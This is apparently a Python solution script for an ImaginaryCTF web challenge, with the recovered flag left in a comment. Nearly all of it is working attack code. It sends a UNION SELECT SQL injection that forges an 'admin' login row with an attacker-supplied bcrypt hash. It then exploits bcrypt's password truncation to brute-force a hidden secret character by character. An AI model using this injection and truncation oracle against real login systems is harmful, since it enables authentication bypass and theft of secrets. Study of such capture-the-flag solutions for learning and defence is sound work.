import string
import requests
import bcrypt
import os

#xxx' UNION SELECT 'admin' AS username,'$2y$10$C4lfi0f8kouggVBFkKF1ru./NEQTKqptjJCh6JI/hJieELWHLeFXi' AS pwhash--

url="http://login.chal.imaginaryctf.org/?688a35c685a7a654abc80f8e123ad9f0"

#flag : ictf{why_are_bcrypt_truncating_my_passwords?!}

secret=["i","c","t","f"]


while True:
	length=71-len(secret)
	overflow="A"*length
	for i in string.printable[:-6]:
		guess=overflow+"".join(secret)+str(i)
		hash=os.popen(f"php exploit.php {guess}").read()
		headers={"Content-Type": "application/x-www-form-urlencoded"}
		data=f"username=xxx'+UNION+SELECT+'admin'+AS+username,'{hash}'+AS+pwhash--&password={overflow}"
		r=requests.post(url,data=data,headers=headers)
		if "Welcome admin" in r.text:
			secret.append(i)
			print(f"found ...","".join(secret))
			break
		else:
			print(f"trying {i}...")


